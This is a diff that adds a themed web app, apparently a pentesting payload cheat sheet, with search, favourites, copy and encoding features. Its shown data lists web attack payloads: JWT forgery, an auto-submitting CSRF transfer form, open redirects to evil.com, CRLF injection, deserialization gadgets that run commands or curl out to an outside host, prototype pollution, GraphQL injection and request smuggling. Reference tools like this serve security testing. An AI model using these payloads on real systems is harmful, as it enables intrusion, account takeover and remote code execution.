+    "alg: none -> eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.",
+    "alg confusion: HS256 signed with RSA public key",
+    "kid path traversal: \"kid\":\"../../dev/null\"",
+    "weak secret bruteforce: hashcat -m 16500 jwt.txt rockyou.txt",
+    "embedded jwk header (jku/jwk) pointing to attacker key"
+  ]},
+  { id:"csrf", title:"CSRF Tricks", icon:"🪤", sev:"med", tags:["auth","client"], items:[
+    "<form action=https://target/transfer method=POST><input name=to value=evil><input name=amt value=1000></form><script>document.forms[0].submit()<\/script>",
+    "<img src=\"https://target/api/delete?id=1\">",
+    "fetch('https://target/api',{method:'POST',credentials:'include',body:'x=1'})",
+    "SameSite bypass: top-level GET navigation"
+  ]},
+  { id:"open-redirect", title:"Open Redirect", icon:"↪️", sev:"low", tags:["client","auth"], items:[
+    "//evil.com",
+    "/\\evil.com",
+    "https://target.com@evil.com",
+    "https://target.com.evil.com",
+    "javascript://%0aalert(1)"
+  ]},
+  { id:"crlf", title:"CRLF / Header Injection", icon:"📡", sev:"med", tags:["server","http"], items:[
+    "%0d%0aSet-Cookie:%20admin=true",
+    "%E5%98%8A%E5%98%8DSet-Cookie:%20admin=true",
+    "User-Agent: <svg onload=alert(1)>",
+    "X-Forwarded-For: 127.0.0.1, evil",
+    "Host: evil.com"
+  ]},
+  { id:"deserial", title:"Deserialization", icon:"📦", sev:"crit", tags:["server","exec"], items:[
+    "Java: ysoserial CommonsCollections1 'curl http://a/`id`'",
+    ".NET: ysoserial.net -g TypeConfuseDelegate -f Json.Net -c calc",
+    "PHP: O:8:\"stdClass\":1:{s:4:\"data\";s:3:\"PoC\";}",
+    "Python pickle: cos\\nsystem\\n(S'id'\\ntR.",
+    "Node node-serialize: _$$ND_FUNC$$_function(){require('child_process').exec('id')}()"
+  ]},
+  { id:"protop", title:"Prototype Pollution", icon:"🧬", sev:"high", tags:["client","node"], items:[
+    "?__proto__[admin]=true",
+    "?constructor[prototype][admin]=true",
+    "{\"__proto__\":{\"polluted\":1}}",
+    "Object.assign({}, JSON.parse('{\"__proto__\":{\"x\":1}}'))"
+  ]},
+  { id:"graphql", title:"GraphQL", icon:"🕸️", sev:"med", tags:["api","server"], items:[
+    "{__schema{types{name fields{name}}}}  // introspection",
+    "query{user(id:\"1' OR '1'='1\"){id}}",
+    "mutation{login(u:\"admin\",p:\"' OR 1=1--\"){token}}",
+    "Batching attack: [{q1},{q2},...] x 1000",
+    "Field duplication: {user{id id id id}}  // resource exhaustion"
+  ]},
+  { id:"race", title:"Race Conditions", icon:"⏱️", sev:"high", tags:["server","logic"], items:[
+    "Last-byte sync: hold N TLS frames, release together (single-packet attack)",
+    "Turbo-Intruder: race-single-packet.py",
+    "Coupon double-spend: parallel POST /redeem N times",
+    "TOCTOU: read-then-act windows on /transfer endpoints"
+  ]},
+  { id:"smuggling", title:"HTTP Request Smuggling", icon:"🚇", sev:"crit", tags:["server","http"], items:[
+    "CL.TE: Content-Length: 6 / Transfer-Encoding: chunked",
+    "TE.CL: TE: chunked / CL: 4",
+    "TE.TE obfuscation: \"Transfer-Encoding : chunked\" / \"Transfer-encoding: x\"",
+    "H2.CL desync (HTTP/2 downgrade): :method POST / content-length: 0"
+  ]},
+  { id:"headers", title:"Security Headers (defense)", icon:"🛡️", sev:"low", tags:["defense","http"], items:[
+    "Content-Security-Policy: default-src 'self'; object-src 'none'; base-uri 'self'",
+    "Strict-Transport-Security: max-age=63072000; includeSubDomains; preload",
+    "Referrer-Policy: strict-origin-when-cross-origin",
+    "Permissions-Policy: camera=(), microphone=(), geolocation=()",
+    "Cross-Origin-Opener-Policy: same-origin",
+    "Cross-Origin-Embedder-Policy: require-corp"
+  ]}
+];
+
+/* Severity meta (color + ring percent) */
+const SEV = {
+  low:  { pct: 25, color: "#9be7a4" },
+  med:  { pct: 50, color: "var(--warn)" },
+  high: { pct: 75, color: "var(--danger)" },
+  crit: { pct: 100, color: "var(--danger)" },
+};
+
+/* ============================================================
+   STATE
+   ============================================================ */
+const state = {
+  query: "",
+  category: "all",
+  favOnly: false,
+  motion: true,
+  scan: localStorage.getItem("scan") === "on",
+  theme: localStorage.getItem("theme") || "matrix",
+  voidUnlocked: localStorage.getItem("void") === "on",
+  favs: new Set(JSON.parse(localStorage.getItem("favs") || "[]")),
+};
+
+const $  = (s, r = document) => r.querySelector(s);
+const $$ = (s, r = document) => Array.from(r.querySelectorAll(s));
+
+/* ============================================================
+   DOM BUILDER — keeps every render path off innerHTML.
+   ============================================================ */
+function el(tag, props, ...children) {
+  const e = document.createElement(tag);
+  if (props) {
+    for (const k in props) {
+      const v = props[k];
+      if (v == null || v === false) continue;
+      if (k === "class") e.className = v;
+      else if (k === "style" && typeof v === "object") Object.assign(e.style, v);
+      else if (k === "data" && typeof v === "object") for (const dk in v) e.dataset[dk] = v[dk];
+      else if (k === "on" && typeof v === "object") for (const ek in v) e.addEventListener(ek, v[ek]);
+      else if (k === "aria" && typeof v === "object") for (const ak in v) e.setAttribute("aria-" + ak, v[ak]);
+      else if (k === "text") e.textContent = v;
+      else if (k in e && k !== "list") { try { e[k] = v; } catch { e.setAttribute(k, v); } }
+      else e.setAttribute(k, v);
+    }
+  }
+  for (const c of children) appendChild(e, c);
+  return e;
+}
+function appendChild(parent, c) {
+  if (c == null || c === false) return;
+  if (Array.isArray(c)) { c.forEach(x => appendChild(parent, x)); return; }
+  parent.appendChild(c instanceof Node ? c : document.createTextNode(String(c)));
+}
+function clear(node) { while (node.firstChild) node.removeChild(node.firstChild); }
+
+/* ============================================================
+   THEME
+   ============================================================ */
+function applyTheme(name) {
+  if (name === "void" && !state.voidUnlocked) return;
+  state.theme = name;
+  document.documentElement.dataset.theme = name;
+  localStorage.setItem("theme", name);
+  $$(".theme-pick button").forEach(b => b.setAttribute("aria-pressed", b.dataset.theme === name));
+  const hudTheme = $("#hudTheme");
+  if (hudTheme) hudTheme.textContent = name;
+}
+function unlockVoid() {
+  state.voidUnlocked = true;
+  localStorage.setItem("void", "on");
+  document.body.dataset.void = "on";
+  toast("VOID theme unlocked");
+}
+if (state.voidUnlocked) document.body.dataset.void = "on";
+applyTheme(state.theme);
+$$(".theme-pick button").forEach(b => b.addEventListener("click", () => applyTheme(b.dataset.theme)));
+
+/* ============================================================
+   SCANLINES
+   ============================================================ */
+function applyScan(on) {
+  state.scan = on;
+  document.body.dataset.scanlines = on ? "on" : "off";
+  localStorage.setItem("scan", on ? "on" : "off");
+  $("#toggleScan").setAttribute("aria-pressed", String(on));
+}
+applyScan(state.scan);
+
+/* ============================================================
+   RENDER — DOM API only, no innerHTML on dynamic content.
+   ============================================================ */
+const grid = $("#grid");
+const chipsEl = $("#chips");
+
+function renderChips() {
+  clear(chipsEl);
+  const cats = [{ id: "all", title: "All" }, ...DATA.map(c => ({ id: c.id, title: c.title }))];
+  for (const c of cats) {
+    chipsEl.appendChild(el("button", {
+      class: "chip",
+      role: "tab",
+      data: { cat: c.id },
+      aria: { pressed: String(state.category === c.id) },
+      text: c.title,
+    }));
+  }
+}
+chipsEl.addEventListener("click", e => {
+  const b = e.target.closest("[data-cat]");
+  if (!b) return;
+  state.category = b.dataset.cat;
+  $$("#chips .chip").forEach(c => c.setAttribute("aria-pressed", String(c.dataset.cat === state.category)));
+  renderGrid();
+});
+
+/* highlight() returns a DocumentFragment of text + <mark> nodes. No HTML strings. */
+function highlight(text, q) {
+  const frag = document.createDocumentFragment();
+  if (!q) { frag.appendChild(document.createTextNode(text)); return frag; }
+  const lower = text.toLowerCase(), needle = q.toLowerCase();
+  let i = 0, n;
+  while ((n = lower.indexOf(needle, i)) !== -1) {
+    if (n > i) frag.appendChild(document.createTextNode(text.slice(i, n)));
+    const m = document.createElement("mark");
+    m.textContent = text.slice(n, n + needle.length);
+    frag.appendChild(m);
+    i = n + needle.length;
+    if (needle.length === 0) break;
+  }
+  if (i < text.length) frag.appendChild(document.createTextNode(text.slice(i)));
+  return frag;
+}
+
+function payloadKey(catId, idx) { return catId + ":" + idx; }
+
+function makeItem(catId, p, idx) {
+  const key = payloadKey(catId, idx);
+  const isFav = state.favs.has(key);
+
+  const actions = el("div", { class: "actions" },
+    el("button", { type: "button", "data-act": "fav",  title: "Favorite (F)", "aria-label": "Toggle favorite" },
+      el("span", { class: "star", text: "★" })),
+    el("button", { type: "button", "data-act": "enc",  title: "Encode menu",  "aria-label": "Encode payload", text: "⧭" }),
+    el("button", { type: "button", "data-act": "copy", title: "Copy",         "aria-label": "Copy payload",   text: "⧉" }),
+  );
+
+  const item = el("div", {
+    class: "item" + (isFav ? " fav" : ""),
+    role: "listitem",
+    tabIndex: 0,
+    data: { key, payload: p },
+  });
+  item.appendChild(highlight(p, state.query));
+  item.appendChild(actions);
+
+  item.addEventListener("click", e => {
+    const btn = e.target.closest("[data-act]");
+    if (!btn) { copy(p); return; }
+    const act = btn.dataset.act;
+    if (act === "copy") copy(p);
+    else if (act === "fav")  toggleFav(key, item);
+    else if (act === "enc")  showEncodeMenu(p, btn);
+  });
+  item.addEventListener("keydown", e => {
+    if (e.target !== item) return;
+    if (e.key === "Enter") { e.preventDefault(); copy(p); }
+    else if (e.key.toLowerCase() === "f") { e.preventDefault(); toggleFav(key, item); }
+  });
+  return item;
+}
+
+function makeCard(c) {
+  const sev = SEV[c.sev] || SEV.low;
+  const card = el("article", { class: "card", data: { id: c.id } });
+
+  const head = el("div", { class: "card-head" },
+    el("div", { class: "icon", "aria-hidden": "true", text: c.icon }),
+    el("h3", { text: c.title }),
+    el("div", {
+      class: "sev-ring",
+      title: c.sev.toUpperCase() + " severity",
+      style: { "--ring": String(sev.pct), "--ring-color": sev.color },
+      "aria-label": c.sev + " severity",
+    }),
+    el("span", { class: "count", text: String(c._items.length) }),
+  );
+
+  const tags = el("div", { class: "tags" },
+    c.tags.map(t => el("span", { class: "tag", text: t })),
+  );
+
+  const list = el("div", { class: "list", role: "list" });
+  for (const { p, idx } of c._items) list.appendChild(makeItem(c.id, p, idx));
+
+  card.appendChild(head);
+  card.appendChild(tags);
+  card.appendChild(list);
+
+  card.addEventListener("pointermove", e => {
+    const r = card.getBoundingClientRect();
+    const x = (e.clientX - r.left) / r.width, y = (e.clientY - r.top) / r.height;
+    card.style.setProperty("--mx", `${x * 100}%`);
+    card.style.setProperty("--my", `${y * 100}%`);
+    card.style.setProperty("--ry", `${(x - .5) * 6}deg`);
+    card.style.setProperty("--rx", `${(.5 - y) * 6}deg`);
+  });
+  card.addEventListener("pointerleave", () => {
+    card.style.setProperty("--rx", "0deg");
+    card.style.setProperty("--ry", "0deg");
+  });
+
+  return card;
+}
+
+function renderGrid() {
+  const q = state.query.trim().toLowerCase();
+  const cats = DATA
+    .filter(c => state.category === "all" || c.id === state.category)
+    .map(c => {
+      const items = c.items
+        .map((p, idx) => ({ p, idx, key: payloadKey(c.id, idx) }))
+        .filter(({ p, key }) => {
+          if (state.favOnly && !state.favs.has(key)) return false;
+          if (!q) return true;
+          return p.toLowerCase().includes(q)
+              || c.title.toLowerCase().includes(q)
+              || c.tags.some(t => t.includes(q));
+        });
+      return { ...c, _items: items };
+    })
+    .filter(c => c._items.length > 0);
+
+  const update = () => {
+    clear(grid);
+    if (!cats.length) {
+      grid.appendChild(el("div", { class: "empty", text: `No payloads match "${state.query}".` }));
+    } else {
+      const frag = document.createDocumentFragment();
+      for (const c of cats) frag.appendChild(makeCard(c));
+      grid.appendChild(frag);
+    }
+    const hudNodes = $("#hudNodes");
+    if (hudNodes) hudNodes.textContent = String(grid.querySelectorAll(".item").length);
+  };
+
+  if (document.startViewTransition) document.startViewTransition(update);
+  else update();
+}
+
+/* ============================================================
+   FAVORITES
+   ============================================================ */
+function toggleFav(key, item) {
+  if (state.favs.has(key)) state.favs.delete(key);
+  else state.favs.add(key);
+  localStorage.setItem("favs", JSON.stringify(Array.from(state.favs)));
+  if (item) item.classList.toggle("fav");
+  toast(state.favs.has(key) ? "Saved to favorites" : "Removed from favorites");
+}
+
+/* ============================================================
+   COPY + ENCODE
+   ============================================================ */
+async function copy(text) {
+  try {
+    await navigator.clipboard.writeText(text);
+    toast("Copied to clipboard");
+  } catch {
+    const ta = document.createElement("textarea");
+    ta.value = text; document.body.appendChild(ta); ta.select();
+    document.execCommand("copy"); ta.remove();
+    toast("Copied (fallback)");
+  }
+}
+const encoders = {
+  "URL":     s => encodeURIComponent(s),
+  "Base64":  s => btoa(unescape(encodeURIComponent(s))),
+  "HTML":    s => s.replace(/[&<>"']/g, c => ({ "&":"&amp;","<":"&lt;",">":"&gt;","\"":"&quot;","'":"&#39;" }[c])),
+  "Hex":     s => Array.from(new TextEncoder().encode(s)).map(b => "\\x" + b.toString(16).padStart(2, "0")).join(""),
+  "Unicode": s => Array.from(s).map(c => "\\u" + c.charCodeAt(0).toString(16).padStart(4, "0")).join(""),
+};
+function showEncodeMenu(payload, anchor) {
+  const existing = $("#encMenu");
+  if (existing) existing.remove();
+  const menu = el("div", {
+    id: "encMenu",
+    role: "menu",
+    style: {
+      position: "absolute", zIndex: 80, padding: "4px",
+      background: "color-mix(in oklab,var(--bg-soft) 95%,transparent)",
+      border: "1px solid var(--line-strong)", borderRadius: "10px",
+      boxShadow: "var(--shadow)", display: "flex", flexDirection: "column", minWidth: "140px",
+      fontFamily: "ui-monospace, monospace", fontSize: ".82rem",
+    },
+  });
+  for (const k of Object.keys(encoders)) {
+    const b = el("button", {
+      type: "button",
+      role: "menuitem",
+      text: "Copy as " + k,
+      style: { background: "transparent", border: "0", color: "var(--fg)", padding: ".45rem .6rem", cursor: "pointer", textAlign: "left", borderRadius: "6px" },
+    });
+    b.addEventListener("mouseenter", () => b.style.background = "color-mix(in oklab,var(--accent) 14%,transparent)");
+    b.addEventListener("mouseleave", () => b.style.background = "transparent");
+    b.addEventListener("click", () => { copy(encoders[k](payload)); menu.remove(); });
+    menu.appendChild(b);
+  }
+  document.body.appendChild(menu);
+  const r = anchor.getBoundingClientRect();
+  const mw = menu.offsetWidth, mh = menu.offsetHeight;
+  const wantLeft = window.scrollX + r.right - mw;
+  const left = Math.max(window.scrollX + 8, Math.min(wantLeft, window.scrollX + innerWidth - mw - 8));
+  const topBelow = window.scrollY + r.bottom + 6;
+  const topAbove = window.scrollY + r.top - mh - 6;
+  const top = (r.bottom + mh + 6 > innerHeight && r.top - mh - 6 > 0) ? topAbove : topBelow;
+  menu.style.left = left + "px";
+  menu.style.top = top + "px";
+  setTimeout(() => {
+    document.addEventListener("click", function close(e) {
+      if (!menu.contains(e.target)) { menu.remove(); document.removeEventListener("click", close); }
+    });
+  }, 0);
+}
+
+/* ============================================================
+   TOAST
+   ============================================================ */
+function toast(msg) {
+  const t = el("div", { class: "toast", text: msg });
+  $("#toasts").appendChild(t);
+  setTimeout(() => { t.classList.add("out"); setTimeout(() => t.remove(), 250); }, 1600);
+}
+
+/* ============================================================
+   SEARCH + FILTERS
+   ============================================================ */
+const searchInput = $("#search");
+let searchTimer;
+searchInput.addEventListener("input", e => {
+  clearTimeout(searchTimer);
+  searchTimer = setTimeout(() => { state.query = e.target.value; renderGrid(); }, 80);
+});
+
+document.addEventListener("keydown", e => {
+  if (e.key === "/" && document.activeElement !== searchInput && !$("#palette[open]")) {
+    e.preventDefault(); searchInput.focus();
+  }
+  if ((e.ctrlKey || e.metaKey) && e.key.toLowerCase() === "k") { e.preventDefault(); openPalette(); }
+  if (e.key === "Escape") closePalette();
+});
+
+$("#toggleFav").addEventListener("click", e => {
+  state.favOnly = !state.favOnly;
+  e.currentTarget.setAttribute("aria-pressed", String(state.favOnly));
+  renderGrid();
+});
+$("#toggleMotion").addEventListener("click", e => {
+  state.motion = !state.motion;
+  e.currentTarget.setAttribute("aria-pressed", String(state.motion));
+  $("#bg").style.display = state.motion ? "" : "none";
+});
+$("#toggleScan").addEventListener("click", () => applyScan(!state.scan));
+
+/* ============================================================
+   COMMAND PALETTE
+   ============================================================ */
+const palette = $("#palette"), palInput = $("#paletteInput"), palList = $("#paletteList");
+let palItems = [], palCursor = 0, palOpener = null;
+
+function buildPaletteItems(q = "") {
+  const out = [];
+  ["matrix","amber","ice","neon","solar"].forEach(t =>
+    out.push({ label: `Theme: ${t}`, hint: "theme", run: () => applyTheme(t) }));
+  if (state.voidUnlocked)
+    out.push({ label: "Theme: void", hint: "theme", run: () => applyTheme("void") });
+  out.push({ label: "Toggle favorites only",      hint: "action", run: () => $("#toggleFav").click() });
+  out.push({ label: "Toggle background animation", hint: "action", run: () => $("#toggleMotion").click() });
+  out.push({ label: "Toggle CRT scanlines",        hint: "action", run: () => $("#toggleScan").click() });
+  DATA.forEach(c => c.items.forEach((p, idx) => {
+    out.push({ label: p, hint: c.title, run: () => copy(p), key: payloadKey(c.id, idx) });
+  }));
+  if (!q) return out.slice(0, 60);
+  const ql = q.toLowerCase();
+  return out.filter(o => o.label.toLowerCase().includes(ql) || o.hint.toLowerCase().includes(ql)).slice(0, 60);
+}
+function renderPalette() {
+  clear(palList);
+  palItems.forEach((o, i) => {
+    palList.appendChild(el("li", {
+      role: "option",
+      data: { i: String(i) },
+      aria: { selected: String(i === palCursor) },
+    },
+      el("span", { style: { opacity: ".6" }, text: "›" }),
+      el("span", { class: "label", text: o.label }),
+      el("small", { text: o.hint }),
+    ));
+  });
+  palList.querySelectorAll("li").forEach(li =>
+    li.addEventListener("click", () => runPalette(Number(li.dataset.i))));
+}
+function runPalette(i) { const o = palItems[i]; if (!o) return; closePalette(); o.run(); }
+function openPalette() {
+  palOpener = document.activeElement;
+  palette.setAttribute("open", "");
+  palInput.value = "";
+  palItems = buildPaletteItems(); palCursor = 0;
+  renderPalette(); palInput.focus();
+}
+function closePalette() {
+  if (!palette.hasAttribute("open")) return;
+  palette.removeAttribute("open");
+  if (palOpener && typeof palOpener.focus === "function") palOpener.focus();
+}
+$("#openPalette").addEventListener("click", openPalette);
+palette.addEventListener("click", e => { if (e.target === palette) closePalette(); });
+palInput.addEventListener("input", e => { palItems = buildPaletteItems(e.target.value); palCursor = 0; renderPalette(); });
+palInput.addEventListener("keydown", e => {
+  if (e.key === "ArrowDown") { palCursor = Math.min(palItems.length - 1, palCursor + 1); renderPalette(); e.preventDefault(); }
+  else if (e.key === "ArrowUp") { palCursor = Math.max(0, palCursor - 1); renderPalette(); e.preventDefault(); }
+  else if (e.key === "Enter") { e.preventDefault(); runPalette(palCursor); }
+});
+
+/* ============================================================
+   STATS COUNT-UP
+   ============================================================ */
+function countUp(node, to, dur = 900) {
+  const start = performance.now();
+  const step = t => {
+    const k = Math.min(1, (t - start) / dur);
+    node.textContent = String(Math.round(to * (1 - Math.pow(1 - k, 3))));
+    if (k < 1) requestAnimationFrame(step);
+  };
+  requestAnimationFrame(step);
+}
+const totalPayloads = DATA.reduce((s, c) => s + c.items.length, 0);
+
+/* ============================================================
+   SPOTLIGHT — body bg responds to cursor.
+   ============================================================ */
+let spotRaf = 0, lastX = 50, lastY = 50;
+window.addEventListener("pointermove", e => {
+  lastX = (e.clientX / innerWidth) * 100;
+  lastY = (e.clientY / innerHeight) * 100;
+  if (spotRaf) return;
+  spotRaf = requestAnimationFrame(() => {
+    document.body.style.setProperty("--cx", lastX + "%");
+    document.body.style.setProperty("--cy", lastY + "%");
+    spotRaf = 0;
+  });
+}, { passive: true });
+
+/* ============================================================
+   HUD — fps + clock + node count + theme
+   ============================================================ */
+(function hud() {
+  const fpsEl = $("#hudFps"), timeEl = $("#hudTime");
+  let frames = 0, t0 = performance.now();
+  function tick(t) {
+    frames++;
+    if (t - t0 >= 1000) {
+      fpsEl.textContent = String(frames);
+      frames = 0; t0 = t;
+    }
+    requestAnimationFrame(tick);
+  }
+  requestAnimationFrame(tick);
+  function clock() {
+    const d = new Date();
+    timeEl.textContent = d.toLocaleTimeString([], { hour12: false });
+  }
+  clock(); setInterval(clock, 1000);
+})();
+
+/* ============================================================
+   KONAMI CODE — unlocks "void" theme (↑↑↓↓←→←→BA)
+   ============================================================ */
+(function konami() {
+  const seq = ["ArrowUp","ArrowUp","ArrowDown","ArrowDown","ArrowLeft","ArrowRight","ArrowLeft","ArrowRight","b","a"];
+  let i = 0;
+  window.addEventListener("keydown", e => {
+    const k = e.key.length === 1 ? e.key.toLowerCase() : e.key;
+    if (k === seq[i]) {
+      i++;
+      if (i === seq.length) { i = 0; if (!state.voidUnlocked) { unlockVoid(); applyTheme("void"); } else applyTheme("void"); }
+    } else {
+      i = (k === seq[0]) ? 1 : 0;
+    }
+  });
+})();
+
+/* ============================================================
+   BACKGROUND CANVAS — DPR-aware, 30fps cap, theme-reactive
+   ============================================================ */
+(function bg() {
+  const c = $("#bg"), x = c.getContext("2d");
+  const chars = "01░▒▓█▀▄│┤┐└┴┬├─┼" +
+                "アイウエオカキクケコサシスセソ" +
+                "タチツテトナニヌネハヒフヘホ" +
+                "マミムメモヤユヨラリルレロワヲン";
+  let dpr, cols, drops, fontSize;
+  function size() {
+    dpr = Math.min(window.devicePixelRatio || 1, 2);
+    c.width  = Math.max(1, Math.floor(innerWidth  * dpr));
+    c.height = Math.max(1, Math.floor(innerHeight * dpr));
+    c.style.width = innerWidth + "px"; c.style.height = innerHeight + "px";
+    fontSize = 16 * dpr;
+    cols = Math.max(1, Math.floor(c.width / fontSize));
+    drops = Array.from({ length: cols }, () => (Math.random() * c.height / fontSize) | 0);
+  }
+  size(); addEventListener("resize", size);
+
+  function readVar(name) { return getComputedStyle(document.documentElement).getPropertyValue(name).trim(); }
+  function hexToRgba(h, a) {
+    h = (h || "").replace("#", ""); if (h.length === 3) h = h.split("").map(c => c + c).join("");
+    const n = parseInt(h, 16) || 0;
+    return `rgba(${(n >> 16) & 255},${(n >> 8) & 255},${n & 255},${a})`;
+  }
+  let accent, fade;
+  function refresh() {
+    accent = readVar("--accent") || "#00ff9c";
+    const bgv = readVar("--bg") || "#07090a";
+    fade = hexToRgba(bgv.startsWith("#") ? bgv : "#07090a", 0.10);
+  }
+  refresh();
+  new MutationObserver(refresh).observe(document.documentElement, { attributes: true, attributeFilter: ["data-theme"] });
+
+  let last = 0, paused = false;
+  document.addEventListener("visibilitychange", () => paused = document.hidden);
+  const targetMs = 1000 / 30;
+
+  function frame(t) {
+    if (!paused && state.motion && t - last >= targetMs) {
+      last = t;
+      x.fillStyle = fade;
+      x.fillRect(0, 0, c.width, c.height);
+      x.font = `${fontSize}px ui-monospace,Menlo,monospace`;
+      for (let i = 0; i < cols; i++) {
+        const ch = chars[(Math.random() * chars.length) | 0];
+        const y = drops[i] * fontSize;
+        x.fillStyle = (Math.random() > .94) ? "#ffffff" : accent;
+        x.fillText(ch, i * fontSize, y);
+        if (y > c.height && Math.random() > .975) drops[i] = 0;
+        drops[i] += 1;
+      }
+    }
+    requestAnimationFrame(frame);
+  }
+  requestAnimationFrame(frame);
+})();
+
+/* ============================================================
+   BOOT REVEAL — typewriter sequence then fade
+   ============================================================ */
+(function boot() {
+  const log = $("#bootLog"), root = $("#boot");
+  const lines = [
+    "[ OK ] init secure channel",
+    "[ OK ] verify CSP + Trusted Types",
+    "[ OK ] load payload index (" + totalPayloads + " entries)",
+    "[ OK ] cold-start render pipeline",
+    "[ ACCESS GRANTED ]"
+  ];
+  if (matchMedia("(prefers-reduced-motion: reduce)").matches) {
+    log.textContent = lines.join("\n");
+    setTimeout(() => root.classList.add("done"), 200);
+    return;
+  }
+  let li = 0, ci = 0, buf = "";
+  function tick() {
+    if (li >= lines.length) { setTimeout(() => root.classList.add("done"), 350); return; }
+    const line = lines[li];
+    if (ci <= line.length) {
+      log.textContent = buf + line.slice(0, ci);
+      ci++;
+      setTimeout(tick, 14);
+    } else {
+      buf += line + "\n"; li++; ci = 0;
+      setTimeout(tick, 90);
+    }
+  }
+  tick();
+})();
+
+/* ============================================================
+   INIT
+   ============================================================ */
+renderChips();
+renderGrid();
+countUp($("#statCats"), DATA.length);
+countUp($("#statPayloads"), totalPayloads);
+$("#hudTheme").textContent = state.theme;
+</script>
+</body>
+</html>
